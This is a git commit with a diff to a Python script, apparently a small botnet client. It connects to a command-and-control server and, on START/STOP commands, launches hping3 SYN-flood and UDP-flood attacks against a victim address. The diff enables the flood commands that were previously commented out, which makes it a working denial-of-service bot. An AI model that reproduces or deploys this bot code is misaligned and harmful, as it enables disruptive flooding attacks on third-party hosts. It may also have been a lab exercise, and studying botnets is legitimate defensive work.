535ed165fe7d0b396a97ee41771a5d3150eacc46
Frederik <f_hansen@live.dk>
2017-12-17 19:15:47 +0100

    our botnet bots and the command server works

--- Attacker/Attacker.py
+++ Attacker/Attacker.py
@@ -3,32 +3,49 @@
 # This is essentially sort of a command & control system
 import subprocess
 import socket
+import sys
+
+attack = None
+CommandServer = ('192.168.2.2', 666)
+
+def endProc(proc):
+	if proc != None:
+		proc.terminate()
+		print 'termiated'
 
 if __name__=='__main__':
-	CommandServer = ('127.0.0.1', 666)
-
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	server.connect(CommandServer)
-	# Wait for command from command server
+	# Listen for command from command server
 	while True:
 		data = server.recv(1024)
-		command, atkType, victim = data.split('/')
+		if data == '':
+			server.connect(CommandServer)
 
-		print command
-		print atkType
-		print victim
+		# Look at how many data fields have been recieved
+		NumberOfStatements = data.count('/') + 1
 
-		attack = None
+		if NumberOfStatements == 3:
+			command, atkType, victim = data.split('/')
+			print command
+			print atkType
+			print victim
+		elif NumberOfStatements == 2:
+			command, victim = data.split('/')
+			print command
+			print victim
 
 		#Start or stop
 		if command == 'START':
 			if atkType == 'syn':
-				print 'im running a SYN attack!'
-				#attack = subprocess.Popen(["hping3","-S","--flood","-V", victim], stdout=subprocess.PIPE)
+				print 'Running a SYN attack...'
+				endProc(attack) # terminate previous
+				#attack = subprocess.Popen(["ping", '127.0.0.1'], stdout=sys.stdout)
+				attack = subprocess.Popen(["hping3","-S","--flood","-V", victim], stdout=subprocess.PIPE)
 			elif atkType == 'udp':
-				print 'im running a UDP attack!'
-				#attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "666", victim], stdout=subprocess.PIPE)
+				print 'Running a UDP attack...'
+				endProc(attack) # terminate previous
+				attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "666", victim], stdout=subprocess.PIPE)
 		elif command == 'STOP':
-			if attack != None:
-				print 'attack stopped!' 
-				#attack.terminate()
+			endProc(attack)
+			print 'Attack stopped'
